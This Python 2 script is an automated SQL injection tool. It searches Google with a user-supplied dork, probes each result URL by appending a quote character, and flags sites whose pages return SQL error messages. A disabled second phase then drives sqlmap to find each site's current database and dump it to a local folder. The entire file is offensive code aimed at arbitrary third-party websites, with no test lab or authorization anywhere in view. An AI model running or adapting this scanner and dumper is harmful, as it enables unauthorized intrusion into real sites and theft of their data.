#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# Auto SQL injection program.
#
# [x] = Success
# [+] = Infomation
# [!] = Error

import re
import sys
import time
import urllib2
import subprocess
from bs4 import BeautifulSoup
from subprocess import Popen


def main():
	argv = sys.argv
	argc = len(argv)
	if (argc != 2):
		print "Usage: python %s <SEARCH TEXT>" % (argv[0])
		print "Example: python %s inurl:.net/view.php?id=" % (argv[0])
		quit()
	else:
		global keyword
		keyword = argv[1] 

		start()

def start():
	print "\n[+] Auto Cracker start\n"
	print "[+] Shift to Phase 1 [SCAN]"
	scan()

def scan():
	attack_code = "%27"             # SQL injection test code. %27 = '
	user_agent  = "Mozilla/5.0"
	headers     = { 'User-Agent' : user_agent }
	global targets
	targets = []
	number  = 0
	try:
		encode   = urllib2.quote(keyword)
		se_num   = 100
		goo_url  = "http://www.google.com/search?q=%s&num=%s" % (encode, se_num)
		goo_req  = urllib2.Request(goo_url, None, headers)
		goo_resp = urllib2.urlopen(goo_req)
		goo_html = goo_resp.read()
		soup     = BeautifulSoup(goo_html, "lxml")
		body     = soup.find_all("a")
		url_list = []
		url_hit  = 0

		for div in body:
			str1 = str(div)
			if str1.find('/url') > -1:
				split1  = str1.split("q=")
				split2  = split1[1].split("&amp")
				url_get = split2[0]
				if url_get.find("https://") > -1:
					pass
				elif url_get.find(".co.jp") > -1:
					pass
				elif url_get.find("amazon") > -1:
					pass
				elif url_get.find("adobe")  > -1:
					pass
				elif url_get.find("microsoft") > -1:
					pass
				elif url_get.find("stackoverflow") > -1:
					pass
				else:
					url_list.append(url_get)
					url_hit += 1

		print "[x] Google search finished. Find URL : %s URLs" % (url_hit)
		print "[+] Start SQLinjection scan to find URL."
		print "[+] URL: <SQLi URL> < [<ERROR TYPE>]\n"

		for url1 in url_list:
			if len(url1) == 0:
				continue
			url    = urllib2.unquote(url1)
			check  = url + attack_code

			try:
				resp = urllib2.urlopen(check)
				html = resp.read()
			except (urllib2.HTTPError, urllib2.URLError):
				continue

			err1 = "MySQL"           # SQLi vulnerable check. SQL error message.
			err2 = "SQL syntax"      # 
			err3 = "on line"         #
			err4 = "Warning"         #

			if html.find(err1) > -1:
				print "[x] URL: %s < [%s]" % (url, err1)
				targets.append(url)
				number += 1
			elif html.find(err2) > -1:
				print "[x] URL: %s < [%s]" % (url, err2)
				targets.append(url)
				number += 1
			elif html.find(err3) > -1:
				print "[x] URL: %s < [%s]" % (url, err3)
				targets.append(url)
				number += 1
			elif html.find(err4) > -1:
				print "[x] URL: %s < [%s]" % (url, err4)
				targets.append(url)
				number += 1
			else:
				pass
		print "\n[x] Phase 1 [Target Scan] Finished."
		print "[+] Find targets: %s" % (number)

		quit()###スキャンのみを行うため終了コード。

		if number > 0:
			print "\n[+] Shift to Phase 2 [HACKING]\n"
			hacking()
	except urllib2.HTTPError, error1:
		if error1.code == 503:
			print "[!] Error - www.google.com anti bot system detection - Error"
			print "[+] Error Code: %s" % (error1.code)
			print "[!] ﾌｧｯｷｭーーー( ﾟДﾟ)凸ーーー!!\n"
		else:
			print "[!] Error - unknown HTTP error- Error"
			print error1
			print "\n"

def hacking():
	output    = "./dump"
	tool_path = "sqlmap/sqlmap.py"										# SQLMap PATH
	option1   = "--current-db --threads=5 --random-agent --batch --retries=0"
	print "[+] Starting sqlmap.py [%s]" % (tool_path)
	for url in targets:
		print "\nTARGET: %s\n\n" % (url)
		cmd = 'python %s -u \"%s\" %s' % (tool_path, url, option1)
		pro = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		try:
			print "[+] Scanning target current-DB."
			print "[+] Please wait...\n"
			for line in pro.communicate():
				if line.find("403") > -1:
					print "[!] Error - Access denied. Code 403 - Error"
					break
				match = re.findall(r'current\sdatabase:\s\s\s\s\'\w+\'', line)
				text  = match[0]
			 	del1  = text.replace('current database:    ', '')
			 	del2  = del1.replace('\'', "")
			 	current_db = del2
				print "[x] Current Database: %s" % (current_db)
				print "[+] Call database dump exploit..."
				option2   = "-D %s --dump --threads=8 --random-agent --batch --output-dir=%s" % (current_db, output)
				cmd2 = 'python %s -u %s %s' % (tool_path, url, option2)
				try:
					print "[x] Dump DB: %s" % (current_db)
					print "\n"
					pro2 = subprocess.Popen(cmd2, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
					print "[+] Dumping DB. Please wait..."
					for line2 in pro2.communicate():
						if line2.find("[ERROR] user quit") > -1:
							print "[!] Error - Hacking failed - Error"
						else:
							print "[x] Hacking success!!"
				except IndexError as e3:
					pass
		except IndexError as e2:
			print "[!] Current Database: Notfound..."
			print e2

	print "\n\n[x] All Phase finished."
	print "[+] Please show [%s]\n" % (output)

if __name__ == "__main__":
	main()
